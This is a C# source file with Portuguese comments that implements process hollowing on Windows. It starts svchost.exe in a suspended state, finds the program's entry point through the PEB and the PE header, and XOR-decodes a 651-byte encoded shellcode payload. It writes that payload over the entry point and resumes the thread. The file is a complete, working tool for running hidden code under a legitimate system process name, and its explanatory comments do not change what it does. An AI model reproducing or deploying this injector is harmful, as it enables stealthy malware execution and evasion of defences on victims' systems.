using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.Threading.Tasks;

namespace Hollow
{
    class Program
    {
        // Estrutura usada pela API CreateProcess para passar informações de inicialização
        // LayoutSequential garante que os campos fiquem na mesma ordem que a estrutura nativa.
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb; // tamanho da estrutura
            public string lpReserved; // reservado (normalmente nulo)
            public string lpDesktop; // desktop associado (opcional)
            public string lpTitle; // título da janela (se houver)
            public Int32 dwX; // posição X da janela
            public Int32 dwY; // posição Y da janela
            public Int32 dwXSize; // largura
            public Int32 dwYSize; // altura
            public Int32 dwXCountChars; // colunas no modo console
            public Int32 dwYCountChars; // linhas no modo console
            public Int32 dwFillAttribute; // atributo de preenchimento
            public Int32 dwFlags; // flags de inicialização
            public Int16 wShowWindow; // como a janela é mostrada
            public Int16 cbReserved2; // reservado
            public IntPtr lpReserved2; // reservado
            public IntPtr hStdInput; // handle de stdin
            public IntPtr hStdOutput; // handle de stdout
            public IntPtr hStdError; // handle de stderr
        }

        // Estrutura que recebe handles e IDs do processo/thread criados por CreateProcess
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess; // handle para o processo criado
            public IntPtr hThread; // handle para a thread principal do processo
            public int dwProcessId; // ID do processo
            public int dwThreadId; // ID da thread
        }

        // Assinatura P/Invoke de CreateProcess (Kernel32)
        // Cria um novo processo. Abaixo uma explicação dos parâmetros:
        // - lpApplicationName: caminho completo do executável. Se null, o sistema usa lpCommandLine.
        // - lpCommandLine: linha de comando para o novo processo (pode incluir argumentos).
        // - lpProcessAttributes: ponteiro para SECURITY_ATTRIBUTES do processo (geralmente IntPtr.Zero).
        // - lpThreadAttributes: ponteiro para SECURITY_ATTRIBUTES da thread (geralmente IntPtr.Zero).
        // - bInheritHandles: se true, handles herdáveis são passados ao processo filho.
        // - dwCreationFlags: flags de criação (ex.: CREATE_SUSPENDED, CREATE_NO_WINDOW). Valores são combináveis.
        // - lpEnvironment: ponteiro para bloco de ambiente (null usa ambiente do processo atual).
        // - lpCurrentDirectory: diretório de trabalho do processo filho (null usa o atual).
        // - lpStartupInfo: referência a STARTUPINFO com configurações de janela e handles std.
        // - lpProcessInformation: saída que recebe handles e IDs do processo/thread criados.
        // Retorno: true em sucesso; false em falha (use GetLastError para detalhes).
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        // Estrutura para receber informações básicas do processo via ZwQueryInformationProcess (NT)
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress; // endereço da PEB (Process Environment Block)
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        // Assinatura para chamada nativa ZwQueryInformationProcess (ntdll), usada para obter informações do processo
        // Parâmetros:
        // - hProcess: handle do processo alvo (obtido por CreateProcess ou OpenProcess).
        // - procInformationClass: código que indica que tipo de informação solicitar (0 = ProcessBasicInformation).
        // - procInformation: referência para a estrutura que receberá os dados (ex.: PROCESS_BASIC_INFORMATION).
        // - ProcInfoLen: tamanho, em bytes, do buffer passado em procInformation.
        // - retlen: saída com a quantidade de bytes realmente escritos/necessários.
        // Retorno: NTSTATUS (0 = sucesso). Em caso de erro, consulte códigos NTSTATUS.
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess(
        IntPtr hProcess,
        int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation,
        UInt32 ProcInfoLen,
        ref UInt32 retlen);

          // Leitura da memória de outro processo (Kernel32)
          // Parâmetros:
          // - hProcess: handle do processo com permissões de leitura (PROCESS_VM_READ).
          // - lpBaseAddress: endereço base no processo remoto onde a leitura começa.
          // - lpBuffer: buffer local que receberá os bytes lidos.
          // - nSize: número de bytes a ler.
          // - lpNumberOfBytesRead: saída com a quantidade de bytes efetivamente lidos.
          // Retorno: true em sucesso; false em falha (verifique GetLastError).
          [DllImport("kernel32.dll", SetLastError = true)]
          public static extern bool ReadProcessMemory(
              IntPtr hProcess,
              IntPtr lpBaseAddress,
              byte[] lpBuffer,
              Int32 nSize,
              out IntPtr lpNumberOfBytesRead);

        // Escrita na memória de outro processo (Kernel32)
        // Parâmetros:
        // - hProcess: handle do processo com permissões de escrita (PROCESS_VM_WRITE | PROCESS_VM_OPERATION).
        // - lpBaseAddress: endereço no processo remoto onde os dados serão escritos.
        // - lpBuffer: buffer local contendo os bytes a serem escritos.
        // - nSize: número de bytes a escrever.
        // - lpNumberOfBytesWritten: saída com a quantidade de bytes efetivamente escritos.
        // Retorno: true em sucesso; false em falha (verifique GetLastError).
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // Retoma a execução de uma thread suspensa
        // Parâmetros:
        // - hThread: handle da thread suspensa (obtido em PROCESS_INFORMATION.hThread)
        // Retorno: valor da contagem de suspensão anterior; 0xFFFFFFFF indica falha.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            // Inicializa estruturas para chamar CreateProcess
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // Cria um processo filho apontando para svchost.exe.
            // Parâmetros:
            // - lpApplicationName: null (usamos o comando completo em lpCommandLine)
            // - lpCommandLine: caminho do executável alvo
            // - dwCreationFlags: 0x4 geralmente indica CREATE_SUSPENDED/flags (aqui usado como exemplo)
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            // Usaremos ZwQueryInformationProcess para obter a PEB do processo criado
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess; // handle para o processo filho
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            // A PEB contém um ponteiro para a imagem base do módulo principal em offset +0x10
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            // Converte os bytes lidos para um ponteiro (endereço base da imagem do executável)
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // Leitura inicial dos primeiros 0x200 bytes do módulo para analisar o cabeçalho PE
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            // O campo e_lfanew no cabeçalho DOS (offset 0x3C) aponta para o NT Headers
            // A partir daí, adicionamos 0x28 para atingir o campo AddressOfEntryPoint no Optional Header (para x86/x64 varia)
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
            uint opthdr = e_lfanew_offset + 0x28;

            // Lemos o RVA do entrypoint (Relative Virtual Address)
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            // Calculamos o endereço absoluto do entrypoint somando a base da imagem
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // Buffer contendo o payload já empacotado/obfuscado (aqui um exemplo de bytes)
            byte[] buf = new byte[651] {
                0xa7, 0x13, 0xd8, 0xbf, 0xab, 0xb3, 0x97, 0x5b, 0x5b, 0x5b, 0x1a, 0x0a,
                0x1a, 0x0b, 0x09, 0x0a, 0x0d, 0x13, 0x6a, 0x89, 0x3e, 0x13, 0xd0, 0x09,
                0x3b, 0x13, 0xd0, 0x09, 0x43, 0x13, 0xd0, 0x09, 0x7b, 0x16, 0x6a, 0x92,
                0x13, 0x54, 0xec, 0x11, 0x11, 0x13, 0xd0, 0x29, 0x0b, 0x13, 0x6a, 0x9b,
                0xf7, 0x67, 0x3a, 0x27, 0x59, 0x77, 0x7b, 0x1a, 0x9a, 0x92, 0x56, 0x1a,
                0x5a, 0x9a, 0xb9, 0xb6, 0x09, 0x13, 0xd0, 0x09, 0x7b, 0xd0, 0x19, 0x67,
                0x1a, 0x0a, 0x13, 0x5a, 0x8b, 0x3d, 0xda, 0x23, 0x43, 0x50, 0x59, 0x54,
                0xde, 0x29, 0x5b, 0x5b, 0x5b, 0xd0, 0xdb, 0xd3, 0x5b, 0x5b, 0x5b, 0x13,
                0xde, 0x9b, 0x2f, 0x3c, 0x13, 0x5a, 0x8b, 0xd0, 0x13, 0x43, 0x0b, 0x1f,
                0xd0, 0x1b, 0x7b, 0x12, 0x5a, 0x8b, 0xb8, 0x0d, 0x13, 0xa4, 0x92, 0x1a,
                0xd0, 0x6f, 0xd3, 0x13, 0x5a, 0x8d, 0x16, 0x6a, 0x92, 0x13, 0x6a, 0x9b,
                0x1a, 0x9a, 0x92, 0x56, 0xf7, 0x1a, 0x5a, 0x9a, 0x63, 0xbb, 0x2e, 0xaa,
                0x17, 0x58, 0x17, 0x7f, 0x53, 0x1e, 0x62, 0x8a, 0x2e, 0x83, 0x03, 0x1f,
                0xd0, 0x1b, 0x7f, 0x12, 0x5a, 0x8b, 0x3d, 0x1a, 0xd0, 0x57, 0x13, 0x1f,
                0xd0, 0x1b, 0x47, 0x12, 0x5a, 0x8b, 0x1a, 0xd0, 0x5f, 0xd3, 0x1a, 0x03,
                0x13, 0x5a, 0x8b, 0x1a, 0x03, 0x05, 0x02, 0x01, 0x1a, 0x03, 0x1a, 0x02,
                0x1a, 0x01, 0x13, 0xd8, 0xb7, 0x7b, 0x1a, 0x09, 0xa4, 0xbb, 0x03, 0x1a,
                0x02, 0x01, 0x13, 0xd0, 0x49, 0xb2, 0x10, 0xa4, 0xa4, 0xa4, 0x06, 0x12,
                0xe5, 0x2c, 0x28, 0x69, 0x04, 0x68, 0x69, 0x5b, 0x5b, 0x1a, 0x0d, 0x12,
                0xd2, 0xbd, 0x13, 0xda, 0xb7, 0xfb, 0x5a, 0x5b, 0x5b, 0x12, 0xd2, 0xbe,
                0x12, 0xe7, 0x59, 0x5b, 0x5b, 0x4e, 0x9b, 0xf3, 0x6a, 0xcf, 0x1a, 0x0f,
                0x12, 0xd2, 0xbf, 0x17, 0xd2, 0xaa, 0x1a, 0xe1, 0x17, 0x2c, 0x7d, 0x5c,
                0xa4, 0x8e, 0x17, 0xd2, 0xb1, 0x33, 0x5a, 0x5a, 0x5b, 0x5b, 0x02, 0x1a,
                0xe1, 0x72, 0xdb, 0x30, 0x5b, 0xa4, 0x8e, 0x31, 0x51, 0x1a, 0x05, 0x0b,
                0x0b, 0x16, 0x6a, 0x92, 0x16, 0x6a, 0x9b, 0x13, 0xa4, 0x9b, 0x13, 0xd2,
                0x99, 0x13, 0xa4, 0x9b, 0x13, 0xd2, 0x9a, 0x1a, 0xe1, 0xb1, 0x54, 0x84,
                0xbb, 0xa4, 0x8e, 0x13, 0xd2, 0x9c, 0x31, 0x4b, 0x1a, 0x03, 0x17, 0xd2,
                0xb9, 0x13, 0xd2, 0xa2, 0x1a, 0xe1, 0xc2, 0xfe, 0x2f, 0x3a, 0xa4, 0x8e,
                0xde, 0x9b, 0x2f, 0x51, 0x12, 0xa4, 0x95, 0x2e, 0xbe, 0xb3, 0x44, 0x5a,
                0x5b, 0x5b, 0x13, 0xd8, 0xb7, 0x4b, 0x13, 0xd2, 0xb9, 0x16, 0x6a, 0x92,
                0x31, 0x5f, 0x1a, 0x03, 0x13, 0xd2, 0xa2, 0x1a, 0xe1, 0x59, 0x82, 0x93,
                0x04, 0xa4, 0x8e, 0xd8, 0xa3, 0x5b, 0x54, 0xd5, 0x36, 0x5b, 0x5b, 0x5b,
                0x13, 0xd8, 0x9f, 0x7b, 0x05, 0xd2, 0xad, 0xda, 0xad, 0x17, 0x7b, 0x94,
                0x75, 0x17, 0xd6, 0xc5, 0x5b, 0x5a, 0x5b, 0x5b, 0x31, 0x1b, 0x1a, 0x02,
                0x33, 0x5b, 0x4b, 0x5b, 0x5b, 0x1a, 0x03, 0x13, 0xd2, 0xa9, 0x13, 0x6a,
                0x92, 0x1a, 0xe1, 0x03, 0xff, 0x08, 0xbe, 0xa4, 0x8e, 0x13, 0xd6, 0xc3,
                0x5b, 0x5a, 0x5b, 0x5b, 0x12, 0xd2, 0x84, 0x08, 0x0d, 0x0b, 0x16, 0x6a,
                0x92, 0x12, 0xd2, 0xab, 0x13, 0xd2, 0x81, 0x13, 0xd2, 0xa2, 0x1a, 0xe1,
                0x59, 0x82, 0x93, 0x04, 0xa4, 0x8e, 0x13, 0xd8, 0x9f, 0x7b, 0xd8, 0xa3,
                0x5b, 0x26, 0x73, 0x03, 0x1a, 0x0c, 0x02, 0x33, 0x5b, 0x1b, 0x5b, 0x5b,
                0x1a, 0x03, 0x31, 0x5b, 0x01, 0x1a, 0xe1, 0x50, 0x74, 0x54, 0x6b, 0xa4,
                0x8e, 0x0c, 0x02, 0x1a, 0xe1, 0x2e, 0x35, 0x16, 0x3a, 0xa4, 0x8e, 0x12,
                0xa4, 0x95, 0xb2, 0x7b, 0xa4, 0xa4, 0xa4, 0x13, 0x5a, 0x98, 0x13, 0x72,
                0x9d, 0x2e, 0xe8, 0x12, 0xd2, 0xa5, 0x04, 0x02, 0x1a, 0x02, 0x1a, 0x0d,
                0xb3, 0x4b, 0x5b, 0x5b, 0x5b, 0xff, 0xc3, 0xea, 0xd3, 0xa5, 0xf4, 0x13,
                0xd4, 0x08, 0xc6, 0x31, 0xcf, 0x6f, 0x9d, 0xdc, 0x93, 0x05, 0x13, 0x6a,
                0x9b, 0x12, 0xd2, 0xa3, 0xf1, 0xa5, 0x9b, 0x2e, 0xa0, 0x13, 0x6a, 0x80,
                0x1a, 0x59, 0x47, 0x5b, 0x13, 0xd2, 0x99, 0xdb, 0xb9, 0x54, 0x59, 0x47,
                0x4d, 0x1a, 0xd1, 0x4f, 0x5b, 0x1a, 0xdd, 0x4f, 0x43, 0x1a, 0xd3, 0x4f,
                0x5b, 0xa5, 0x9b, 0x2e, 0xb8, 0x13, 0x6a, 0x80, 0xa5, 0x9b, 0x1a, 0x59,
                0x47, 0x5b, 0x1a, 0xd1, 0x4f, 0x5b, 0x1a, 0xdd, 0x4f, 0x43, 0x1a, 0xd3,
                0x4f, 0x5b, 0x1a, 0x59, 0x4f, 0x43, 0x1a, 0xd1, 0x4f, 0x4b, 0x1a, 0x6b,
                0x4a, 0x12, 0xa4, 0x9a, 0x13, 0xa4, 0x92, 0x2e, 0x80, 0x04, 0x1a, 0xa4,
                0xbc, 0x03, 0x31, 0x5b, 0x02, 0xe0, 0xbb, 0x46, 0x71, 0x51, 0x1a, 0xd2,
                0x81, 0xa4, 0x8e
            };

            // Copie este loop para o seu Main:
            byte xKey = 0x5b;
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ xKey);
            }

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}